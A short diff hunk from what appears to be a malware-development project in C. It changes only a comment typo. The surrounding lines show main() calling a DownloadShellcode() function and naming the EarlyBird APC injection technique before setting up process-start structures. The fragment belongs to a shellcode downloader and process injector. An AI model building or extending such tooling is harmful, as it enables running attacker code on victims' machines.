@@ -53,7 +53,7 @@ void DownloadShellcode() {
 
 int main() {
 
-  //usualy EarlyBirdAPC Injection technique. For seperate code with explanation, see my another repo "Malware Development :) "
+  //usual EarlyBirdAPC Injection technique. For seperate code with explanation, see my another repo "Malware Development :) "
 	DownloadShellcode();
 
 	STARTUPINFOA stinfo = { 0 };
